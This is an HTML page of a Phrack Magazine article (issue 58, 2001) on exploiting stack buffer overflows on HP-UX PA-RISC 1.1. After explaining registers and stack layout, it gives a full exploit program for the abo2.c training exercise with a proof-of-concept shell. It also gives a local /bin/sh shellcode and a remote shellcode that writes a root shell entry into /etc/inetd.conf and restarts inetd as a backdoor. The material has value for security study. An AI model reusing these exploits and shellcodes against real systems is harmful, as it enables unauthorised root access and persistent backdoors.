@@ -1,0 +1,736 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: HP-UX (PA-RISC 1.1) Overflows ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a class="current" href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack58.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack58.tar.gz" title="Get current issue tar.gz">58</a> | <strong>Release date</strong> : <b>2001-12-28</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/58/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/3.html#article">Phrack Signalnoise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/4.html#article">Advanced return-into-lib(c) exploits (PaX case study)</a></td><td align="right">nergal</td></tr>
+<tr><td align="left"><a href="../../issues/58/5.html#article">Runtime binary encryption</a></td><td align="right">scut &amp; grugq</td></tr>
+<tr><td align="left"><a href="../../issues/58/6.html#article">Advances in kernel hacking</a></td><td align="right">palmers</td></tr>
+<tr><td align="left"><a href="../../issues/58/7.html#article">Linux on-the-fly kernel patching without LKM</a></td><td align="right">devik &amp; sd</td></tr>
+<tr><td align="left"><a href="../../issues/58/8.html#article">Linux x86 kernel function hooking emulation</a></td><td align="right">mayhem</td></tr>
+<tr><td align="left"><a href="../../issues/58/9.html#article">RPC without borders</a></td><td align="right">stealth</td></tr>
+<tr><td align="left"><a href="../../issues/58/10.html#article">Developing StrongARM/Linux shellcode</a></td><td align="right">funkysh</td></tr>
+<tr><td align="left"><a href="../../issues/58/11.html#article">HP-UX (PA-RISC 1.1) Overflows</a></td><td align="right">Zhodiac</td></tr>
+<tr><td align="left"><a href="../../issues/58/12.html#article">The Security of Vita Vuova's Inferno OS</a></td><td align="right">dalai</td></tr>
+<tr><td align="left"><a href="../../issues/58/13.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/14.html#article">Phrack magazine extraction utility</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : HP-UX (PA-RISC 1.1) Overflows</div>
+<div class="opt-bottom"> <strong>Author</strong> : Zhodiac</div>
+<pre>                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3a, Phile #0x0b of 0x0e
+
+|=-----------------=[ HP-UX (PA-RISC 1.1) Overflows ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------=[ Zhodiac  &lt;zhodiac@softhome.net&gt; ]=------------------=|
+
+
+--[ Introduction.
+
+
+  Damn it, another buffer overflow document!! Well, this paper is not
+intended to explain buffer overflow exploitations, neither is intended to
+explain asm coding. This paper focuses mainly in three topics: 
+
+  HP-UX/PA-RISC registers and stack organization, a solution for abo2.c
+(located at community.core-sdi.org/~gera/InsecureProgramming/) and finally
+two shellcodes for this OS/arch.
+
+  It covers basic topics to start exploiting buffer overflows under
+HP-UX/PA-RISC 1.1. This paper is divided into the following sections:
+
+
+  1. PA-RISC Introduction
+    1.1. RISC fundamentals
+    1.2. Registers
+    1.3. Leaf and non-leaf functions
+  2. Stack organization
+  3. Advance Buffer Overflow #2
+  4. Extras
+    4.1. Local Shellcode
+    4.2. Remote Shellcode
+  5. Resources
+  6. Greetings
+
+
+--[ 1. PA-RISC Introduction
+
+--[ 1.1. RISC fundamentals
+
+  RISC (Reduced Instruction Set Computing) refers to procesors with a
+reduced instruction set, and with the ability to do the same tasks of a
+CISC processor (Complex Instruction Set Computing).
+
+RISC processors have some common caracteristics:
+
+  - Load, store design for memory access
+  - Reduce number of addressing
+  - Instruction size is always the same (Speeds up)  
+  - Few instructions format
+  - More use of registers rather than memory
+
+Deep in PA-RISC arch we have some more defined caracteristics:
+
+  - Immediate addressing, base relative without offset
+  - Predecrement in an instruction
+  - Postincrement in an instruction
+  - 12 instruction formats, all of them have 32 bits
+
+
+--[ 1.2. Registers
+
+On PA-RISC 1.1 there are four types of registers:
+
+  - General registers (32)
+  - Float point registers (32)
+  - Space registers (8)
+  - Control registers (25)
+
+	
+  We will focus on the &quot;General registers&quot; which are the ones that get
+involved in shellcodes programming and buffer overflow exploiting. These
+registers can be used at any time even when cpu is not on privilege state,
+except %gr0 (%r0) as we will see.
+
+Lets explain some uses of the general registers	
+ 
+  - %gr0: Always contains the value 0 and if you write something on it, 
+          will be discarded
+  - %gr1: It is the implicit target register of the ADDIL instruction.
+          When calling a shared library function it will store the return 
+          address of the so called &quot;shared library stub&quot; before calling 
+          the function
+  - %gr2 (%rp): In this register it is stored the return address when a 
+          function call is done with BL (Branch and Link)
+  - %gr3-%gr21: General use registers
+  - %gr19: Is the linkage table base register when calling a shared 
+          library function
+  - %gr22: Stores the syscall number when you are going to call one of 
+          them
+  - %gr23-gr26: Stores the functions arguments arg0-arg3
+  - %gr28,gr29 (%ret0, %ret1): In %gr28 is stored the return value of a 
+          function or syscall. (An inmediat value or a reference address). 
+          Under certain circunstances the value is sotred in %gr29
+  - %gr30: Here it is sotred the current Stack pointer. It has to be  
+          aligned to 16 bits
+  - %gr31: Under PA-RISC 2.0 it contains the return address when a BLE 
+          instruction is executed
+
+Some final notes:
+
+  - Under PA-RISC 1.0 there are only 16 Floating-Point registers and under   
+    PA-RISC 1.1 and 2.0 there are 32
+  - Control registers are only accessible when the CPU is in privilege mode
+  - Under PA-RISC 2.0 registers size is 64 bits
+
+
+--[ 1.3. Leaf and non-leaf functions
+
+There are mainly two classes of functions under HP-UX (similar as SPARC):
+
+  - Leaf functions: They DO NOT call any further function.
+
+  Leaf funtions, since they do not call any further function never store
+%rp in memory because it will never be overwritting by a new function
+called. 
+
+Here is an example on code and its gdb disass dump of a leaf function.
+
+HP9000:~/overflows/leaf$ cat leaf.c 
+
+int leaf(char *buff) {
+  int a=0;
+  a=1;
+}
+
+int main(int argc, char **argv) {
+  leaf(argv[1]);
+}
+
+HP9000:~/overflows/leaf$
+
+You can see in the gdb disass dump it never saves %rp in stack.
+
+(gdb) disass leaf
+Dump of assembler code for function foo:
+0x3280 &lt;leaf&gt;:           copy r3,r1
+0x3284 &lt;leaf+4&gt;:         copy sp,r3
+0x3288 &lt;leaf+8&gt;:         stw,ma r1,40(sr0,sp)
+0x328c &lt;leaf+12&gt;:        stw r26,-24(sr0,r3)
+0x3290 &lt;leaf+16&gt;:        stw  r0,8(sr0,r3)
+0x3294 &lt;leaf+20&gt;:        ldi 1,r19
+0x3298 &lt;leaf+24&gt;:        stw  r19,8(sr0,r3)
+0x329c &lt;leaf+28&gt;:        ldo 40(r3),sp
+0x32a0 &lt;leaf+32&gt;:        ldw,mb -40(sr0,sp),r3
+0x32a4 &lt;leaf+36&gt;:        bv,n r0(rp)
+End of assembler dump.
+(gdb)
+
+
+  - Non-Leaf funtions: They DO call at least one function.
+
+  Non-Leaf funtions, since they do not call any further function always
+stores %rp in stack (as we will see) because the function called is going
+to overwrite %rp with its wn return pointer.
+
+Here is an example on code and its gdb disass dump of a leaf funtion.
+
+HP9000:~/overflows/non-leaf$ cat non-leaf.c
+  
+int non_leaf(char *buff) {
+  int a=0;
+  a=1;
+  sleep(1);
+}
+
+int main(int argc, char **argv) {
+  non_leaf(argv[1]);
+}
+
+HP9000:~/overflows/non-leaf$
+
+You can see in the gdb disass dump it saves %rp in stack at
+&quot;stw rp,-14(sr0,sp)&quot;.
+
+(gdb) disass non_leaf
+Dump of assembler code for function foo:
+0x32b0 &lt;non_leaf&gt;:           stw rp,-14(sr0,sp)
+0x32b4 &lt;non_leaf+4&gt;:         copy r3,r1
+0x32b8 &lt;non_leaf+8&gt;:         copy sp,r3
+0x32bc &lt;non_leaf+12&gt;:        stw,ma r1,80(sr0,sp)
+0x32c0 &lt;non_leaf+16&gt;:        stw r26,-24(sr0,r3)
+0x32c4 &lt;non_leaf+20&gt;:        stw  r0,8(sr0,r3)
+0x32c8 &lt;non_leaf+24&gt;:        ldi 1,r19
+0x32cc &lt;non_leaf+28&gt;:        stw  r19,8(sr0,r3)
+0x32d0 &lt;non_leaf+32&gt;:        ldi 1,r26
+0x32d4 &lt;non_leaf+36&gt;:        b,l 0x3298 &lt;sleep&gt;,rp
+0x32d8 &lt;non_leaf+40&gt;:        nop
+0x32dc &lt;non_leaf+44&gt;:        ldw -14(sr0,r3),rp
+0x32e0 &lt;non_leaf+48&gt;:        ldo 40(r3),sp
+0x32e4 &lt;non_leaf+52&gt;:        ldw,mb -40(sr0,sp),r3
+0x32e8 &lt;non_leaf+56&gt;:        bv,n r0(rp)
+0x32ec &lt;non_leaf+60&gt;:        break 0,0
+End of assembler dump.
+(gdb)
+
+
+--[ 2. Stack organization
+
+  The following stack organization is brought up under PA-RISC 1.1 on a
+HP-UX B10.20 and using the gcc compiler (though i will explain some few
+thing of native cc). I have not seen any documentation about this stuff, so
+it was based on gdb and my deduction ability.
+
+  PA-RISC does not have instructions like &quot;save&quot;, &quot;restore&quot; to save the
+registers values in a function prelude as SPARC does. all this stuff is
+implemented via software and changes between compilers.
+
+  We will focus on non-leaf functions that are the ones that get involved
+on buffer overflows. All &quot;non-leaf&quot; functions implements a prelude and a
+final of a funtion, for example in main():
+
+
+        0x3380 &lt;main&gt;:          stw rp,-14(sr0,sp)
+        0x3384 &lt;main+4&gt;:        copy r3,r1
+        0x3388 &lt;main+8&gt;:        copy sp,r3
+        0x338c &lt;main+12&gt;:       stw,ma r1,40(sr0,sp)
+        0x3390 &lt;main+16&gt;:       stw r26,-24(sr0,r3)
+        0x3394 &lt;main+20&gt;:       stw r25,-28(sr0,r3)
+
+        ...
+
+        0x33e0 &lt;main+96&gt;:       ldw -14(sr0,r3),rp
+        0x33e4 &lt;main+100&gt;:      ldo 40(r3),sp
+        0x33e8 &lt;main+104&gt;:      ldw,mb -40(sr0,sp),r3
+        0x33ec &lt;main+108&gt;:      bv,n r0(rp)
+
+
+        We are going to see step by step what is going on:
+
+  - 0x3380 &lt;main&gt;:          stw rp,-14(sr0,sp)
+
+    Store the return address (in %rp after the BL) in %sp-0x14. Native C 
+    compiler stores it in %sp-0x18.    
+
+  - 0x3384 &lt;main+4&gt;:        copy r3,r1
+ 
+    Make a copy of %r3 in %r1. This is because in %r3 will store the %sp 
+    of the previous function, as we will see.
+   
+  - 0x3388 &lt;main+8&gt;:        copy sp,r3
+
+    Copy %sp in %r3.
+
+  - 0x338c &lt;main+12&gt;:       stw,ma r1,40(sr0,sp)
+
+    Stores %r1 (the sp of to back functions) in the stack and increments
+    %sp in 0x40. This 0x40 is because it reserves space for its own local 
+    variables plus 64 bytes for the frame maker and the arguments of the 
+    following function. (Notice the frame maker is of the next function 
+    that is to be called, this is very important!).
+
+  - 0x3390 &lt;main+16&gt;:       stw r26,-24(sr0,r3)
+
+    Copies the first argument (%r26) of the function to stack (space 
+    reserved of the last function), at %r3 (last %sp) - 0x24.
+
+  - 0x3394 &lt;main+20&gt;:       stw r25,-28(sr0,r3)
+    
+    Copies the second argument (%r25) of the fucntion to stack (space
+    reserved of the last function), at %r3 (last %sp) - 0x28.
+
+    Like the last two instructions mechanism, the first four arguments 
+    will be stored (%r26-%r23). In case there are more than four arguments
+    before the jmp to the function is done they will be store in stack
+    where they fit.
+
+    F.e.   arg4 ---&gt; %r3 - 52
+           arg5 ---&gt; %r3 - 56
+           arg6 ---&gt; %r3 - 60
+           ...
+
+  So the stack organization will look like this:
+
+
+                 |                         |
+                 --------------------------- %sp    \
+                 |                         |        |
+                 |                         |        |
+                 |                         |        | 
+                 |                         |        | 
+                 |                         |        |
+                 |                         |        | Space reserved  
+                 |                         |        | for the Frame Maker
+                 |                         |        | and the arguments
+                 |                         |        | of the following
+                 |                         |        | function.
+                 |                         |        | Always 64 bytes.
+                 |                         |        | 
+                 |                         |        | 
+                 |                         |        |
+                 |                         |        |
+                 |                         |        |
+                 ---------------------------       /
+                 |                         |       \
+                 |                         |        | Space reserved for
+                             ...                    | the local variables
+                 |                         |        | of the function
+                 |                         |        | + 4 bytes (%r1) 
+                 |           %r1           |       /
+                 --------------------------- %r3   \
+         -4      |                         |        |
+         -8      |                         |        |
+         -12     |                         |        | Frame Maker of the
+         -16     |                         |        | current function
+         -20     |       %r2 (%rp) gcc     |        | 
+         -24     |       %r2 (%rp) cc      |        |
+         -28     |                         |        |
+         -32     |                         |       /
+         -36     |       arg1 = %r26       |       \
+         -40     |       arg2 = %r25       |        |
+         -44     |       arg3 = %r24       |        | Space reserved
+         -48     |       arg4 = %r23       |        | for the arguments 
+         -52     |       arg5              |        | of the current
+         -56     |       ...               |        | function
+         -60     |                         |        | 
+         -64     |                         |        |
+                 ---------------------------       /
+                 |                         |
+
+  With this usefull information, if a buffer overflow happens in stack and
+we overflow a local variable of a function, we will overwrite the Frame
+Maker of the next function called. This &quot;next function&quot; used to be the
+function that makes the copy of the buffer, f.e. strcpy(), sprintf() etc. 
+
+  This is why the following program could not be exploited because there is
+not a &quot;next function&quot; that copies the buffer, because we copy the buffer
+with a while.
+
+
+  void vulnerable_func(char *buffer) {
+  char buffer2[128];
+  int counter=0;
+
+     while(buffer[counter]!='\0') {
+      buffer2[counter]=buffer[counter];
+      counter++;
+     }
+
+   printf(&quot;Buffer: %s\n&quot;,buffer);
+  }
+
+  int main(int argc, char **argv) {
+
+   vulnerable_func(argv[1]);
+  }
+
+
+  In the end part of each function we undo all the operations we have seen:
+read %rp from stack, restore %sp and %r3 and branches to %rp.
+
+
+--[ 3. Advanced Buffer Overflow #2
+
+In the following web page:
+
+  http://community.core-sdi.com/~gera/InsecureProgramming/
+
+there are some programs vulnerable to many types of bugs such as buffer
+overflow, heap overflow, format string bugs, ...
+
+  We will focus in the Advance Buffer Overflow #2 (abo2.c) which gave many
+people headaches.
+
+
+HP9000:~/overflows/sample$ cat abo2.c
+/* abo2.c                                                    *
+ * specially crafted to feed your brain by gera@core-sdi.com */
+
+/* This is a tricky example to make you think                *
+ * and give you some help on the next one                    */
+
+ int main(int argv,char **argc) {
+    char buf[256];
+
+    strcpy(buf,argc[1]);
+    exit(1);
+    } 
+HP9000:~/overflows/sample$
+
+  Many people say that &quot;its exploitation is not possible&quot;. I go further
+saying &quot;its exploitation is not possible in x86 architectures&quot;, but in
+others like PA-RISC it can be exploitable.
+
+  In x86 platforms, by supplying a buffer long enough, you will overwrite
+the return address of main(), but due to the uneludable exit() we will
+never have the control of the flow of the vulnerable program. Better said:
+&quot;I have not been able to have control of it ;P&quot;
+
+  We have to find a way to control the flow of our program before exit() is
+executed. Under HP-UX10.20/PA-RISC, because stack (%r30 or %sp) grows from
+lower address to higher address (against some other architectures do such
+as Linux x86) and also due to the stack organization explained in this
+document, we will not overwrite the return address of main() but we will
+overwrite the return address of strcpy(). So once the buffer is copied, and
+once strcpy branches to its own %rp, it will go to our shellcode having
+control of the flow of the program before exit() is executed.
+   
+  All this is due to strcpy(), is implemented, under HP-UX B.10.20 as a
+non-leaf funtion (it will store its own return pointer in stack). Fyodor
+Yarochkin told me that strcpy() under HP-UX 11.00 is implemented as a leaf
+funtion, so this particular overflow will not be exploitable on that
+version of HP-UX. 
+
+  I am not saying strcpy()'s overflows are not posible to exploit under
+HP-UX 11.00. Take a look at this piece of code and find why it is still
+possible.
+
+HP9000:~/overflows/hp11-strcpy$ cat hp11-strcpy.c  	
+void foo(char *buff,char *dest) {
+  strcpy(dest,buff);
+}
+
+int main(int argc, char **argv) { 
+  char buffer[128];
+
+  foo(argv[1],buffer);
+}
+HP9000:~/overflows/hp11-strcpy$
+
+
+Proof of concept:
+
+HP9000:~/overflows/sample$ uname -a
+HP-UX HP9000 B.10.20 A 9000/712 2013496278 two-user license 
+HP9000:~/overflows/abo2$ cat abo2.c
+/* abo2.c                                                    *
+ * specially crafted to feed your brain by gera@core-sdi.com */
+  
+/* This is a tricky example to make you think                *
+ * and give you some help on the next one                    */
+ 
+ int main(int argv,char **argc) {
+    char buf[256];
+     
+    strcpy(buf,argc[1]);  
+    exit(1);
+    }
+HP9000:~/overflows/abo2$
+
+HP9000:~/overflows/abo2$ cat xploit.c
+/*
+ * abo2.c xploit by Zhodiac &lt;zhodiac@softhome.net&gt;
+ *
+ * http://community.core-sdi.com/~gera/InsecureProgramming/  
+ * 
+ * Xploited on HPUX
+ * 9/9/2001
+ * 
+ * Madrid
+ *
+ */
+#include &lt;stdio.h&gt;
+    
+//#define NOP 0x3902800b
+#define NOP 0x08630243
+#define BUFFSIZE 256+48+1 
+#define NUMADDR 10
+#define OFFSET -80
+  
+char shellcode[] =
+&quot;\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40&quot;
+&quot;\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe&quot;
+&quot;\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe&quot;
+&quot;/bin/sh\xff&quot;;
+
+long get_sp(void) {
+   __asm__(&quot;copy %sp,%ret0 \n&quot;);
+}
+  
+int main(int argc, char *argv[]) {
+char buffer[BUFFSIZE];
+char *ch_ptr;
+unsigned long addr,offset=OFFSET;
+int aux;
+
+ if (argc==2) offset=atoi(argv[1]);
+
+ addr=get_sp()+offset;
+
+ memset(buffer,0,sizeof(buffer));
+ ch_ptr=(char *)buffer;
+
+ for (aux=0; aux&lt;(BUFFSIZE-strlen(shellcode)-NUMADDR*4)/4; aux++) {
+      *(ch_ptr++)=(NOP&gt;&gt;24)&amp;255;
+      *(ch_ptr++)=(NOP&gt;&gt;16)&amp;255;
+      *(ch_ptr++)=(NOP&gt;&gt;8)&amp;255;
+      *(ch_ptr++)=NOP&amp;255;
+      }
+
+ memcpy(ch_ptr,shellcode,strlen(shellcode));
+ ch_ptr+=strlen(shellcode);
+ for (aux=0; aux&lt;NUMADDR; aux++) {
+     *(ch_ptr++)=(addr&gt;&gt;24)&amp;255;
+     *(ch_ptr++)=(addr&gt;&gt;16)&amp;255;   
+     *(ch_ptr++)=(addr&gt;&gt;8)&amp;255;
+     *(ch_ptr++)=addr&amp;255;
+     }
+ 
+ buffer[BUFFSIZE-1]='\0';
+ printf(&quot;Return Address %#x\n&quot;,addr);
+ printf(&quot;Buffer Size: %i\n&quot;,strlen(buffer));
+      
+ if (execl(&quot;./abo2&quot;,&quot;abo2&quot;,buffer,NULL)==-1) {
+    printf(&quot;Error at execl()\n&quot;);
+    exit(-1);
+    }  
+
+}
+HP9000:~/overflows/abo2$ 
+ 
+HP9000:~/overflows/abo2$ gcc -o xploit xploit.c
+HP9000:~/overflows/abo2$ gcc -o abo2 abo2.c
+     
+HP9000:~/overflows/abo2$ ./xploit
+Return Address 0x7b03a5b0
+Buffer Size: 304
+$ uname -a
+HP-UX HP9000 B.10.20 A 9000/712 2013496278 two-user license
+$ exit
+HP9000:~/overflows/abo2$
+
+
+--[ 4. Extras
+
+  Here are two shellcodes for HP-UX. First is a local one, it just executes
+a /bin/sh but notice its reduced size, only 47 bytes. Second one was, in
+its development time, the first remote shellcode I know about. It uses
+inetd to put a shell on a tcp port. There is a third shellcode which
+implements all syscalls socket(), bind(), dup2() but I lost it. Shit
+happens (Also fsck does also). :(
+
+
+--[ 4.1. Local Shellcode
+   
+  Nowadays there are some HP-UX shellcode (Fyodor's home some developed,
+lsd-pl some more), but in its development time the only one public was the
+one of K2 of ADM. This shellcode is a bit optimized, because it is 13
+bytes lower in size.
+
+
+/*
+ * HP-UX 47 bytes shellcode
+ *
+ *    By Zhodiac &lt;zhodiac@softhome.net&gt;
+ *
+ * Madrid, 13/05/2001
+ *
+ */
+
+
+char shellcode[]=
+&quot;\xe8\x3f\x1f\xfd&quot;      /*              bl salto,%r1               */
+&quot;\x0b\x39\x02\x99&quot;      /* salto:       xor %r25,%r25,%r25         */
+&quot;\x34\x02\x04\xc0&quot;      /*              ldi 0x260,%r2              */
+&quot;\x08\x41\x04\x03&quot;      /*              sub %r1,%r2,%r3            */
+&quot;\x60\x79\x05\x08&quot;      /*              stb %r25,0x284(%sr0,%r3)   */
+&quot;\xb4\x7a\x04\xfa&quot;      /*              addi 0x27D,%r3,%r26        */
+&quot;\x0b\x18\x02\x98&quot;      /*              xor %r24,%r24,%r24         */
+&quot;\x20\x20\x08\x01&quot;      /*              ldil L'0xC0000004,%r1      */
+&quot;\xe4\x20\xe0\x08&quot;      /*              ble R'0xC0000004(%sr7,%r1) */
+&quot;\x94\x56\x05\x36&quot;      /*              subi 0x29b,%r2,%r22        */
+&quot;/bin/sh&quot;;
+
+
+--[ 4.2. Remote Shellcode
+
+/*
+ * HP-UX remote shellcode
+ *
+ *    By Zhodiac &lt;zhodiac@softhome.net&gt;
+ *
+ * Madrid, 14/05/2001
+ *
+ */
+
+char shellcode[]=
+&quot;\xe8\x3f\x1f\xfd&quot;      /*              bl salto,%r1               */
+&quot;\x0b\x39\x02\x99&quot;      /* salto:       xor %r25,%r25,%r25         */
+&quot;\x34\x02\x04\xc0&quot;      /*              ldi 0x260,%r2              */
+&quot;\x08\x41\x04\x03&quot;      /*              sub %r1,%r2,%r3            */
+&quot;\x60\x79\x05\x78&quot;      /*              stb %r25,0x2BC(%sr0,%r3)   */
+&quot;\x60\x79\x05\x7e&quot;      /*              stb %r25,0x2BF(%sr0,%r3)   */
+&quot;\x68\x79\x05\x62&quot;      /*              stw %r25,0x2AE(%sr0,%r3)   */
+&quot;\xb4\x7a\x05\x6A&quot;      /*              addi 0x2B5,%r3,%r26        */
+&quot;\x0f\x5a\x12\x81&quot;      /*              stw %r26,-16(%sr0,%r26)    */
+&quot;\x94\x44\x04\xd0&quot;      /*              subi 0x268,%r2,%r4         */
+&quot;\x0b\x44\x06\x04&quot;      /*              add %r4,%r26,%r4           */
+&quot;\x0f\x44\x12\x89&quot;      /*              stw  %r4,-12(%sr0,%r26)    */
+&quot;\x94\x44\x04\xd6&quot;      /*              subi 0x26C,%r2,%r4         */
+&quot;\x0b\x44\x06\x04&quot;      /*              add %r4,%r26,%r4           */
+&quot;\x0f\x44\x12\x91&quot;      /*              stw  %r4,-8(%sr0,%r26)     */
+&quot;\xb7\x59\x07\xe1&quot;      /*              addi -16,%r26,%r25         */
+&quot;\x0b\x18\x02\x98&quot;      /*              xor %r24,%r24,%r24         */
+&quot;\x20\x20\x08\x01&quot;      /*              ldil L'0xC0000004,%r1      */
+&quot;\xe4\x20\xe0\x08&quot;      /*              ble R'0xC0000004(%sr7,%r1) */
+&quot;\x94\x56\x05\x36&quot;      /*              subi 0x29b,%r2,%r22        */
+&quot;AAAA&quot;
+&quot;BBBB&quot;
+&quot;CCCC&quot;
+&quot;ZZZZ&quot;
+&quot;/bin/sh -c echo \&quot;eklogin stream tcp nowait root /bin/sh sh -i\&quot; &gt;&gt; &quot;
+&quot;/etc/inetd.conf ; /usr/sbin/inetd -c ; &quot;;
+
+
+--[ 5. References
+
+For further information you may consult:
+
+ [1]  Some PDFs i found at http://www.freelsd.net/~ndubee/ (Great 
+      collection :) and http://docs.hp.com/
+      * PA-RISC 1.1 Architecture and Instruction Set Reference Manual
+      * PA-RISC Architecture and Instruction Set Reference Manual
+      * http://www.devresource.hp.com/partner/rad.10.20.pdf
+      * http://www.devresource.hp.com/partner/rad.11.0.32.pdf
+
+ [2]  PA-RISC 2.0 Architecture
+      Gerry Kane
+      ISBN 0-13-182734-0
+
+ [3]  Buffer overflow on non-intel platforms (BlackHat 2001 Asia) 
+      Fyodor Yarochkin. 
+      http://www.notlsd.net/bof/index.html
+
+ [4]  lsd-pl HP-UX shellcodes (You people, are really good! Hope to talk 
+      to you in future!)
+      http://lsd-pl.net
+
